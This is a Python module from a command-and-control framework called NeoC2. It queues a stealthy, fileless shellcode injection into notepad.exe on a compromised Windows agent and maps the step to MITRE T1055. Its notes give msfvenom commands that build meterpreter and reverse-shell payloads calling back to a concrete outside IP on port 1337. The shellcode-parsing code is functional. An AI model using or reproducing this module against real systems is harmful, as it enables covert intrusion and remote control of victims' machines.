import os
import importlib.util
import base64
import re

def get_info():
    return {
        "name": "pinject",
        "description": "Stealthily inject shellcode into a target process (notepad.exe) on Windows systems without touching disk",
        "type": "exploitation",
        "platform": "windows",
        "author": "NeoC2 Framework",
        "references": [
            "https://github.com/NeoC2",
            "https://www.rapid7.com/docs/msfvenom/"
        ],
        "technique_id": "T1055",  # Process Injection
        "mitre_tactics": ["Defense Evasion", "Privilege Escalation"],
        "options": {
            "agent_id": {
                "description": "ID of the agent to run process injection on",
                "required": True
            },
            "shellcode": {
                "description": "The shellcode to inject, either as raw bytes, hex string, or msfvenom base64 output",
                "required": True
            }
        },
        "notes": {
            "msfvenom_examples": [
                "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=89.116.49.235 LPORT=1337 -f raw | base64",
                "msfvenom -p windows/x64/exec CMD='calc.exe' -f raw | base64",
                "msfvenom -p windows/x64/shell_reverse_tcp LHOST=89.116.49.235 LPORT=1337 -f raw | base64"
            ]
        }
    }


def execute(options, session):
    agent_id = options.get("agent_id")
    shellcode_input = options.get("shellcode")

    if not agent_id:
        return {
            "success": False,
            "error": "agent_id is required"
        }

    if not shellcode_input:
        return {
            "success": False,
            "error": "shellcode is required"
        }

    # Set the current agent in the session
    session.current_agent = agent_id

    # Process the shellcode input - allow different formats
    try:
        shellcode_bytes = process_shellcode_input(shellcode_input)
    except ValueError as e:
        return {
            "success": False,
            "error": f"Invalid shellcode format: {str(e)}"
        }

    # Base64 encode the shellcode bytes
    encoded_shellcode = base64.b64encode(shellcode_bytes).decode('utf-8')

    # Create the command with the 'shellcode' prefix that the agent recognizes
    command = f"shellcode {encoded_shellcode}"

    # Check if session has a valid agent_manager
    if not hasattr(session, 'agent_manager') or session.agent_manager is None:
        return {
            "success": False,
            "error": "Session does not have an initialized agent_manager"
        }

    # Queue the task on the agent
    try:
        agent_manager = session.agent_manager
        task_id = agent_manager.add_task(agent_id, command)
        if task_id:
            return {
                "success": True,
                "output": f"Process injection task {task_id} queued for agent {agent_id}",
                "task_id": task_id,
                "target_process": "notepad.exe"
            }
        else:
            return {
                "success": False,
                "error": f"Failed to queue task for agent {agent_id}"
            }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error queuing task: {str(e)}"
        }


def process_shellcode_input(shellcode_input):
    if isinstance(shellcode_input, bytes):
        return shellcode_input

    if not isinstance(shellcode_input, str):
        raise ValueError("Shellcode must be a string or bytes")

    # Check if it's base64 encoded (common from msfvenom)
    if is_base64(shellcode_input):
        try:
            return base64.b64decode(shellcode_input)
        except Exception:
            pass  # Not valid base64, continue to other formats

    # Check if it's a hex string format
    # Remove common hex prefixes and separators
    clean_hex = shellcode_input.replace('0x', '').replace(',', '').replace('\\', '').replace(' ', '').replace('\n', '').replace('\t', '')

    # Validate that it's a valid hex string
    if re.match(r'^[0-9a-fA-F]+$', clean_hex) and len(clean_hex) % 2 == 0:
        try:
            return bytes.fromhex(clean_hex)
        except ValueError:
            raise ValueError("Invalid hex string for shellcode")

    # If it's not base64 or hex, treat as raw string (less common)
    return shellcode_input.encode('utf-8')


def is_base64(s):
    try:
        # Check if length is a multiple of 4
        if len(s) % 4 != 0:
            return False

        # Check if it contains only valid base64 characters
        if not re.match(r'^[A-Za-z0-9+/]*={0,2}$', s):
            return False

        # Actually try to decode it
        decoded = base64.b64decode(s)
        # Check if re-encoding produces the same result (with padding normalized)
        encoded = base64.b64encode(decoded).decode('utf-8')
        return encoded == s.strip('=')
    except Exception:
        return False